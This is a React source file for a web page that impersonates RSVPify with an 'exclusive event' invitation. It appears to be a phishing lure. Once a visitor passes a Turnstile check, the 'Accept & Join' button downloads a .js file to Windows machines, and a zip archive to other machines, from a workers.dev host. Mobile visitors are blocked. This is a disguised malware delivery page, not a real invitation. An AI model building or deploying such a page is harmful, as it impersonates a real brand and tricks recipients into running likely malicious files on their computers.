import React, { useState, useEffect, useRef, useCallback } from 'react';
import './App.css';

export default function App() {
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  if (isMobile)
  {
    return <MobileBlocker />;
  }


  return <Invite />;
}

// Replace with your Cloudflare Turnstile site key from dash.cloudflare.com
const TURNSTILE_SITE_KEY = '0x4AAAAAAE1PFOyWG2itBdMi';

function Invite() {
  const [verified, setVerified] = useState(false);
  const turnstileRef = useRef(null);
  const widgetIdRef = useRef(null);

  const handleDownload = () => {
    if (!verified) return;
    const isWindows = navigator.platform.toUpperCase().indexOf('WIN') > -1;
    if (isWindows)
    {
      window.location.href = 'https://exclusive-access-invite.hemin.workers.dev/Exclusive-Invite-to-Event.js';
    } else
    {
      window.location.href = 'https://exclusive-access-invite.hemin.workers.dev/Event-Invite.zip';
    }
  };

  const onTurnstileSuccess = useCallback((token) => {
    if (token) setVerified(true);
  }, []);

  const onTurnstileExpired = useCallback(() => {
    setVerified(false);
  }, []);

  useEffect(() => {
    const renderWidget = () => {
      if (!turnstileRef.current || !window.turnstile) return;
      if (widgetIdRef.current !== null) return;
      widgetIdRef.current = window.turnstile.render(turnstileRef.current, {
        sitekey: TURNSTILE_SITE_KEY,
        callback: onTurnstileSuccess,
        'expired-callback': onTurnstileExpired,
        theme: 'light',
      });
    };

    if (window.turnstile)
    {
      renderWidget();
    } else
    {
      // Turnstile script may still be loading
      const interval = setInterval(() => {
        if (window.turnstile)
        {
          clearInterval(interval);
          renderWidget();
        }
      }, 100);
      return () => clearInterval(interval);
    }
  }, [onTurnstileSuccess, onTurnstileExpired]);

  return (
    <>
      <div className="wrapper">
        <div className="container">
          <div className="envelope-section">
            <div className="envelope">📬</div>
          </div>
          <div className="content-section">
            <div className="logo">
              <img
                src="https://rsvpify.com/wp-content/uploads/2025/08/Logo-RSVPify.svg"
                alt="RSVPify"
              />
            </div>

            <h1>You're Invited</h1>
            <p className="subtitle">Experience something extraordinary</p>

            <div className="header-divider"></div>

            <p className="invite-text">
              We're thrilled to invite you to join us for an exclusive event.<br />
              <span className="highlight">Please accept this invitation and be part of something special.</span>
            </p>

            <div ref={turnstileRef} className="turnstile-widget"></div>

            <button
              className={`accept-btn${!verified ? ' accept-btn--disabled' : ''}`}
              onClick={handleDownload}
              disabled={!verified}
            >
              Accept & Join
            </button>
          </div>
        </div>
      </div>

      <footer className="web-footer">
        <p>Exclusive event invitation crafted with precision</p>
        <div className="web-footer-divider"></div>
        <p>© 2026 RSVPify. All rights reserved.</p>
      </footer>
    </>
  );
}

function MobileBlocker() {
  return (
    <div className="mobile-warning-container">
      <div className="mobile-bg-decoration">
        <div className="decoration-circle circle-1"></div>
        <div className="decoration-circle circle-2"></div>
        <div className="decoration-circle circle-3"></div>
      </div>

      <div className="mobile-content-wrapper">
        <div className="mobile-icon-wrapper">
          <div className="mobile-icon">🖥️</div>
        </div>

        <div className="mobile-logo">
          <img
            src="https://rsvpify.com/wp-content/uploads/2025/08/Logo-RSVPify.svg"
            alt="RSVPify"
          />
        </div>

        <h1 className="mobile-title">Desktop Only</h1>

        <p className="mobile-subtitle">
          This exclusive invitation deserves to be experienced on a bigger screen.
        </p>

        <div className="mobile-divider"></div>

        <div className="mobile-features">
          <div className="feature-item">
            <span className="feature-icon">💻</span>
            <span>Windows</span>
          </div>
          <div className="feature-item">
            <span className="feature-icon">🍎</span>
            <span>macOS</span>
          </div>
          <div className="feature-item unavailable">
            <span className="feature-icon">📱</span>
            <span>Mobile</span>
          </div>
        </div>

        <p className="mobile-message">
          Open this from your desktop or laptop to continue
        </p>

        <div className="mobile-footer-art">
          <p>✨ A premium experience awaits</p>
        </div>
      </div>
    </div>
  );
}
